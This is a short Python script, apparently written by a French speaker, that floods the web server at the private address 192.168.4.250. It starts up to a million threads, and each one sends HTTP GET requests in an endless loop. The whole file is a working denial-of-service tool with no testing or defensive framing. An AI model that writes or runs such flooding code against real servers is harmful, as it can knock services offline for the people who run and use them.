import threading
import requests
import time

url = "http://192.168.4.250/"
num_threads = 1000000  

def connect_to_server(thread_num):
    try:
        while True:
            response = requests.get(url)
            response.raise_for_status()  
            print(f"Requête envoyée à {url}. Statut de la réponse : {response.status_code}")
    except Exception as e:
        print("error")

threads = []

for i in range(num_threads):
    thread = threading.Thread(target=connect_to_server, args=(i+1,))
    threads.append(thread)
    thread.start()
    time.sleep(0.05)

for thread in threads:
    thread.join()



